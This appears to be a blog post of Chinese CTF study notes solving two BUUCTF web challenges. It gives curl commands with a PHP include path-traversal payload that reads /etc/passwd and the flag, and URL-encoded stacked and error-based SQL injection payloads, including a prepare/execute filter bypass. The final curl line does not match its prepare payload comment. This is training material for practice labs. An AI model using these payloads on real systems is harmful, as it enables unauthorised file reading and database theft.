@@ -1,0 +1,129 @@
+---
+layout: post
+title:  "信息安全学习笔记 - BUUCTF Web"
+date:   2020-04-12 23:00:38 +0800
+---
+
+# Problems
+
+## [HCTF 2018] WarmUp 1
+
+```shell
+url='http://a762a799-746e-4549-beb3-a076fbfd409e.node3.buuoj.cn/'
+# 发现注释里有一个source.php 结果是一堆 entity encoding，先用 perl 处理一下
+curl $url'source.php' | perl -MHTML::Entities -pe 'decode_entities($_)' > source.php
+
+# 看下是什么编码？
+file source.php
+# source.php: ISO-8859 text, with very long lines
+# 转换一下编码
+iconv -f 'ISO-8859-1' -t 'UTF-8' source.php -o source.php
+
+# 改后缀html，用浏览器打开看起来像是源代码，但是有很多标签；用脚本再处理一下，终于能看了
+# 源代码的意思大概是包含一个名字和参数file的值相同的文件；
+# 本来只能包含白名单source和hint这两个文件，但是却截取字符串中"?"之前的内容，用来和白名单比较
+cp source.php source.html
+./hctf_2018_warm_up_1_strip.py source.html > source.php
+
+# 发现有个hint.php
+curl $url'hint.php'
+# flag not here, and flag in ffffllllaaaagggg
+
+# 尝试访问 ffffllllaaaagggg 未果
+curl $url'ffffllllaaaagggg'
+curl $url'source.php?file=ffffllllaaaagggg'
+# 不行
+```
+谷歌说可以给参数插入问号`?`和连续多个父目录`..`，比如PHP会把 `hint.php?/../`之后的内容视为当前目录，这里的原理还没有完全弄清楚；可能截取参数"?"是在对这个现象的提示？
+
+```shell
+# 因为源码用了REQUEST，表示参数从查询参数或表单中取得都是可以的
+curl $url'source.php' -X POST -d 'file=hint.php?/../../../../etc/passwd'
+curl $url'source.php?file=hint.php?/../../../../etc/passwd'
+# 插入很多个父目录
+curl $url'source.php?file=hint.php?/../../../../../ffffllllaaaagggg'
+```
+
+```python
+# !/usr/bin/python3
+# encoding=utf8
+# hctf_2018_warm_up_1_strip.py
+# Remove html tags
+import sys
+
+with open(sys.argv[1], encoding='utf8') as f:
+  import re
+  content = f.read()
+  
+  content = re.sub(r'\<span[^>]+\>', '', content)
+  content = re.sub(r'\</span>', '', content)
+  content = re.sub(r'\<br\s*/\>', '\n', content)
+  print(content)
+```
+
+## [[强网杯 2019]随便注 1](http://91b13641-161f-4df8-9290-e2d26f5c5340.node3.buuoj.cn/)
+
+```shell
+url="http://91b13641-161f-4df8-9290-e2d26f5c5340.node3.buuoj.cn/?inject="
+# 有一个 inject 参数。发现是 PHP
+curl $url'1'
+
+# q("1' -- a")
+# 带上引号和注释，发现没有报错，原来的SQL应该是 'SELECT * FROM WHERE A=\''.$inject.'\' ... '
+curl $url'1%27%20--%20a'
+
+# q("1' order by 3 -- a")
+# 报错，表示有2列
+curl $url'1%27%20order%20by%203%20--%20a'
+
+# q("9' union select 1,2,3 -- a")
+# 不OK。下面的正则表达式表示关键字 select等，以及句号 . 被过滤掉了，大小写不能通过
+# return preg_match("/select|update|delete|drop|insert|where|\./i",$inject)
+curl $url'9%27%20union%20select%201%2C2%2C3%20--%20a'
+# error-based sqli 看用户名 root@localhost，数据库名 supersqli，版本 10.3.18-MariaDB
+# q("9' and extractvalue('',concat('~',user(),'~')) -- a")
+curl $url'9%27%20and%20extractvalue%28%27%27%2Cconcat%28%27%7E%27%2Cuser%28%29%2C%27%7E%27%29%29%20--%20a'
+```
+
+谷歌给的提示是可以尝试看下是否可以注入多个SQL语句；既然 select 不能用来查DB信息，可以用一下 show 语句。
+
+```shell
+# 看schema 
+# q("1';show databases#")
+# 这里也不需要短路，会直接显示所有表
+curl $url'1%27%3Bshow%20databases%23'
+# 看表
+# q("1';show tables#")
+# 有两个表，1919810931114514 和 words
+curl $url'9%27%3Bshow%20tables%23'
+# 看表结构
+# q("1'; desc `1919810931114514` #")
+# 有两列 flag 和 NO，答案就在这个表 
+curl $url'1%27%3B%20desc%20%601919810931114514%60%20%23'
+```
+
+但是还是不清楚怎么把答案select出来。谷歌说还有一种叫做**预编译SQL**的操作，简单来说就是在允许执行多个SQL语句的情况下，先prepare拼接sql语句然后execute。
+
+```shell
+# q("1'; prepare stat from concat('sel', 'ect * from `1919810931114514`'); execute stat;#")
+# 有两列 flag 和 NO，答案就在这个表 
+curl $url'1%27%3B%20desc%20%601919810931114514%60%20%23'
+```
+
+
+# Notes
+
+- php
+  - [isset](https://www.php.net/manual/en/function.isset.php)
+  - [mb_substr](https://www.php.net/manual/en/function.mb-substr.php)
+  - [in_array](https://www.php.net/manual/en/function.in-array.php)
+  - [mb_strpos](https://www.php.net/manual/en/function.mb-strpos.php)
+  - [include](https://www.php.net/manual/en/function.include.php)
+    - `hint.php?/../XXXXXX`
+    - consecutive `../`s
+  - [multi_query](/)
+- sql
+  - error-based sqli
+    - `extractvalue(frag, xpath)` xpath
+  - [Prepared statement](https://dev.mysql.com/doc/refman/8.0/en/sql-prepared-statements.html)
+    - prepare; set; execute
